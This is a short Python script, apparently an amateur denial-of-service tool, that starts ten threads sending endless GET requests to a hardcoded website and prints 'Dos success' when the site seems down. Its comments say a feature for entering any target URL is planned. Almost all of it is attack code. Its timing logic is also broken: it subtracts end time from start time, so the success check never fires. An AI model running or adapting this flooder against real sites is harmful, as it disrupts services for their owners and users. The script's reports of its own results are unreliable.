import requests 
import threading 
import time
l=[]
def count_ck(time_):
    l.append(time_)
    for e in l:
        if e<=1:
            l.remove(e)
         
def count_Time():
    return round(time.time())
def make_request():
    while True:
        try:
            start_time =count_Time()
            result = requests.get('https://sridharanitharan.me')#must want https://user input (feature update)
            end_time = count_Time()
            final_time= start_time - end_time
            count_ck(final_time)
            if(final_time>60000):
                print("Dos success , still site looking down ")
            
            elif(result.status_code == 200):
                print(f"Response code[{result.status_code} OK]")
                pass
            else:
                print(f"Responce code[{result.status_code}]")
        except:
            print("Invalid  URL  its Not in Alive")
            break
            
thread = 10
while(thread>=1):
    start_thread = threading.Thread(target=make_request)
    thread -=1
    start_thread.start()
    print("#{}thread...".format(thread))
    
#still is working but some update add in featurely